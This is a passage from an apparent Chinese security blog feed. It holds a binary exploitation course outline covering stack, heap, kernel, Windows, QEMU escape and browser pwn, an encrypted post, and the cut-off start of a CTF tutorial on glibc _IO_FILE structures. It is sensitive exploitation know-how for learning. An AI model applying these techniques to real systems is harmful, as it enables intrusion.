</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>3</td>
<td>ret2shellcode</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>4</td>
<td>ret2syscall</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>5</td>
<td>ret2libc</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>6</td>
<td>ret2libc</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>7</td>
<td>stack_pivoting</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>8</td>
<td>ret2csu</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>9</td>
<td>ret2dl-resolve</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>10</td>
<td>ret2vDSO</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>11</td>
<td>SROP</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>12</td>
<td>BROP</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>13</td>
<td>沙箱及其绕过</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>13</td>
<td>侧信道攻击</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>14</td>
<td>stack_protector_bypass</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>15</td>
<td>格式化字符串漏洞</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td><strong>linux user pwn 堆篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>堆基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>堆基本操作</td>
</tr>
<tr>
<td></td>
<td></td>
<td>相关数据结构</td>
</tr>
<tr>
<td>2</td>
<td>堆基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>堆分配关键过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>源码解读</td>
</tr>
<tr>
<td>3</td>
<td>堆利用（持续更新）</td>
<td>这个部分将会持续更新，堆利用手法太多。包括how2heap全系列的讲解以及新的利用手段，每个手法都会单出视频进行原理和例题的解析</td>
</tr>
<tr>
<td><strong>linux user pwn IO_FILE篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>IO_FILE基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>IO_FILE简介</td>
</tr>
<tr>
<td></td>
<td></td>
<td>相关数据结构</td>
</tr>
<tr>
<td>2</td>
<td>IO_FILE基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础利用手法</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>3</td>
<td>IO_FILE利用（持续更新）</td>
<td>这个部分和堆篇一样持续更新，手法太多，讲解一些新老利用手法，每个手法单独出一个视频，原理和例题解析</td>
</tr>
</tbody></table>
<h2 id="Linux-pwn-精进篇"><a href="#Linux-pwn-精进篇" class="headerlink" title="Linux pwn 精进篇"></a>Linux pwn 精进篇</h2><table>
<thead>
<tr>
<th><strong>linux user pwn LLVM PASS PWN篇</strong></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>LLVM PASS PWN基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>LLVM</td>
</tr>
<tr>
<td></td>
<td></td>
<td>LLVM IR</td>
</tr>
<tr>
<td></td>
<td></td>
<td>LLVM PASS</td>
</tr>
<tr>
<td>2</td>
<td>LLVM PASS PWN解析</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td><strong>linux user pwn 异构篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>ARM PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>2</td>
<td>AARCH64 PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>3</td>
<td>MIPS PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>4</td>
<td>PowerPC PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td><strong>linux user pwn musl pwn篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>musl pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基本数据结构</td>
</tr>
<tr>
<td></td>
<td></td>
<td>函数分析</td>
</tr>
<tr>
<td>2</td>
<td>musl-1.2.0 pwn 堆利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础讲解</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>3</td>
<td>musl-1.2.3 pwn 堆利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础讲解</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>4</td>
<td>musl pwn IO_FILE 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础讲解</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td><strong>linux kernel pwn 基础篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核基础知识讲解</td>
</tr>
<tr>
<td>2</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核内存管理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核保护机制</td>
</tr>
<tr>
<td>3</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核环境搭建</td>
</tr>
<tr>
<td>4</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>linux内核模块开发</td>
</tr>
<tr>
<td><strong>linux kernel pwn 利用篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>kernel pwn 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Kernel stack buffer oveflow</td>
</tr>
<tr>
<td>2</td>
<td>kernel pwn 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>kernel Heap Expliot</td>
</tr>
<tr>
<td>3</td>
<td>kernel pwn 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Race condition</td>
</tr>
<tr>
<td>4</td>
<td>kernel pwn 利用</td>
<td>kernel 常用结构体利用，这个部分持续更新一些 kernel 的新老利用手法</td>
</tr>
</tbody></table>
<h2 id="Windows-pwn-篇"><a href="#Windows-pwn-篇" class="headerlink" title="Windows pwn 篇"></a>Windows pwn 篇</h2><table>
<thead>
<tr>
<th>windows user pwn 基础篇</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td>2</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>函数调用约定</td>
</tr>
<tr>
<td></td>
<td></td>
<td>PE格式</td>
</tr>
<tr>
<td>3</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>函数调用约定</td>
</tr>
<tr>
<td></td>
<td></td>
<td>PE格式及常见地址泄露方法</td>
</tr>
<tr>
<td>4</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows 异常处理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows IO_FILE</td>
</tr>
<tr>
<td>5</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows 异常处理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows IO_FILE</td>
</tr>
<tr>
<td>6</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Windows 堆概述</td>
</tr>
<tr>
<td>7</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>NT Heap</td>
</tr>
<tr>
<td>8</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap VS堆</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap LFH堆</td>
</tr>
<tr>
<td>9</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap 后端堆</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap LB堆</td>
</tr>
<tr>
<td><strong>windows user pwn 利用篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>stack overflower</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>32位栈溢出</td>
</tr>
<tr>
<td></td>
<td></td>
<td>64位栈溢出</td>
</tr>
<tr>
<td>2</td>
<td>ORW</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>32位ORW</td>
</tr>
<tr>
<td></td>
<td></td>
<td>64位ORW</td>
</tr>
<tr>
<td>3</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Unlink(NT 后端heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>4</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>任意地址Malloc(NT heap 后端heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>5</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Heap overlap(NT heap 后端heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>6</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>reuse attack(NT heap LFH heap)</td>
</tr>
<tr>
<td>7</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>double malloc(segment heap LFH heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>8</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>heap overlap(segment heap 后端 heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
</tbody></table>
<h2 id="Pwn-番外篇"><a href="#Pwn-番外篇" class="headerlink" title="Pwn 番外篇"></a>Pwn 番外篇</h2><table>
<thead>
<tr>
<th>虚拟机逃逸篇</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 与 kvm架构</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 虚拟化</td>
</tr>
<tr>
<td>2</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>PCI 设备</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu object model</td>
</tr>
<tr>
<td>3</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 设备分析过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 常见函数</td>
</tr>
<tr>
<td>4</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 设备分析过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 常见函数</td>
</tr>
<tr>
<td>5</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 逃逸实战</td>
</tr>
<tr>
<td><strong>浏览器Pwn篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础知识介绍</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td>2</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>浏览器常用的class</td>
</tr>
<tr>
<td></td>
<td></td>
<td>v8的object通用结构体</td>
</tr>
<tr>
<td>3</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>常见类型结构</td>
</tr>
<tr>
<td></td>
<td></td>
<td>实战</td>
</tr>
<tr>
<td>4</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>heap sandbox</td>
</tr>
<tr>
<td>5</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Justin Time Compiler</td>
</tr>
<tr>
<td></td>
<td></td>
<td>实战</td>
</tr>
<tr>
<td>6</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>hole</td>
</tr>
<tr>
<td></td>
<td></td>
<td>实战</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Archives</category>
      </categories>
  </entry>
  <entry>
    <title>车联网安全基础</title>
    <url>/2023/10/25/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>深入理解Pwn_IO_FILE及相关赛题详细解析</title>
    <url>/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/">深入理解Pwn_Heap及相关例题</a></p>
<p><a class="link"   href="https://elixir.bootlin.com/glibc/glibc-2.23/source" >源码查看网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文主要参考<a class="link"   href="https://blog.csdn.net/qq_54218833/article/details/126082743?spm=1001.2014.3001.5502" >C0Lin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和<a class="link"   href="https://sky123.blog.csdn.net/?type=blog" >_sky123_ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>两位宝藏师傅的博客。</p>
<p>本文写的较为冗余，适合和我一样的新手朋友看。文中并没有对堆的手法进行详细的说明，文章的堆利用手法可以看上面的文章（包括了目前 <code>how2heap</code> 里全系列的手法，其他手法有时间会补充到里面）。后面关于 <code>_IO_FILE</code> 利用的手法会更新在这里（方便查）。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="IO相关重要结构体概述"><a href="#IO相关重要结构体概述" class="headerlink" title="IO相关重要结构体概述"></a>IO相关重要结构体概述</h2><p>进行文件读写操作时会为对应文件创建一个 <code>_IO_FILE_plus</code> 结构体，并且链接到 <code>_IO_list_all</code> 链表 <strong>头部</strong> 上，<code>vtable</code> 指向一张虚函数表<code>_IO_jump_t</code>，此表中记录着对文件进行的各种操作，<code>_IO_FILE</code> 和 <code>_IO_jump_t</code> 组成了 <code>_IO_FILE_plus</code>。 <code>stdin, stdout, stderr</code> 是位于 <code>libc.so</code> 中，而通过 <code>fopen</code> 的创建的则是位于堆内存。</p>
<p><strong>glibc-2.23源</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="comment">/* vtable 一般都不可修改，vtable 是否可写跟 libc 有关，有的高版本 libc 反而可写，比如 glibc-2.34。*/</span></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// amd64 如下</span></span><br><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">	<span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>;</span><br><span class="line">	<span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>;   <span class="comment">// 操作起始地址</span></span><br><span class="line">	<span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>;  <span class="comment">// stdin 缓冲结束地址 </span></span><br><span class="line">	<span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>; <span class="comment">// stdin 缓冲起始地址 </span></span><br><span class="line">	<span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>;<span class="comment">// stdout 缓冲起始地址 </span></span><br><span class="line">	<span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>; <span class="comment">// 操作起始地址</span></span><br><span class="line">	<span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>; <span class="comment">// stdout 缓冲结束地址 </span></span><br><span class="line">	<span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>;  <span class="comment">// 缓冲区起始地址 </span></span><br><span class="line">	<span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>;   <span class="comment">// 缓冲区结束地址</span></span><br><span class="line">	<span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>;</span><br><span class="line">	<span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>;</span><br><span class="line">	<span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>;</span><br><span class="line">	<span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>;</span><br><span class="line">	<span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>;</span><br><span class="line">	<span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>;</span><br><span class="line">	<span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>;</span><br><span class="line">    <span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>;</span><br><span class="line">	<span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>;</span><br><span class="line">	<span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>;</span><br><span class="line">	<span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>;</span><br><span class="line">	<span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>;</span><br><span class="line">	<span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>;</span><br><span class="line">	<span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>;</span><br><span class="line">	<span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>;</span><br><span class="line">	<span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>;</span><br><span class="line">	<span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>;</span><br><span class="line">	<span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>;</span><br><span class="line">	<span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>;</span><br><span class="line">	<span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">	<span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">JUMP_FIELD</span>(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    <span class="number">0x8</span>:<span class="built_in">JUMP_FIELD</span>(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    <span class="number">0x10</span>:<span class="built_in">JUMP_FIELD</span>(_IO_finish_t, __finish);</span><br><span class="line">    <span class="number">0x18</span>:<span class="built_in">JUMP_FIELD</span>(_IO_overflow_t, __overflow);</span><br><span class="line">    <span class="number">0x20</span>:<span class="built_in">JUMP_FIELD</span>(_IO_underflow_t, __underflow);</span><br><span class="line">    <span class="number">0x28</span>:<span class="built_in">JUMP_FIELD</span>(_IO_underflow_t, __uflow);</span><br><span class="line">    <span class="number">0x30</span>:<span class="built_in">JUMP_FIELD</span>(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="number">0x38</span>:<span class="built_in">JUMP_FIELD</span>(_IO_xsputn_t, __xsputn);</span><br><span class="line">    <span class="number">0x40</span>:<span class="built_in">JUMP_FIELD</span>(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    <span class="number">0x48</span>:<span class="built_in">JUMP_FIELD</span>(_IO_seekoff_t, __seekoff);</span><br><span class="line">    <span class="number">0x50</span>:<span class="built_in">JUMP_FIELD</span>(_IO_seekpos_t, __seekpos);</span><br><span class="line">    <span class="number">0x58</span>:<span class="built_in">JUMP_FIELD</span>(_IO_setbuf_t, __setbuf);</span><br><span class="line">    <span class="number">0x60</span>:<span class="built_in">JUMP_FIELD</span>(_IO_sync_t, __sync);</span><br><span class="line">    <span class="number">0x68</span>:<span class="built_in">JUMP_FIELD</span>(_IO_doallocate_t, __doallocate);</span><br><span class="line">    <span class="number">0x70</span>:<span class="built_in">JUMP_FIELD</span>(_IO_read_t, __read);</span><br><span class="line">    <span class="number">0x78</span>:<span class="built_in">JUMP_FIELD</span>(_IO_write_t, __write);</span><br><span class="line">    <span class="number">0x80</span>:<span class="built_in">JUMP_FIELD</span>(_IO_seek_t, __seek);</span><br><span class="line">    <span class="number">0x88</span>:<span class="built_in">JUMP_FIELD</span>(_IO_close_t, __close);</span><br><span class="line">    <span class="number">0x90</span>:<span class="built_in">JUMP_FIELD</span>(_IO_stat_t, __stat);</span><br><span class="line">    <span class="number">0x98</span>:<span class="built_in">JUMP_FIELD</span>(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    <span class="number">0xa0</span>:<span class="built_in">JUMP_FIELD</span>(_IO_imbue_t, __imbue);</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">        get_column;</span><br><span class="line">        set_column;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> &#123;</span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span 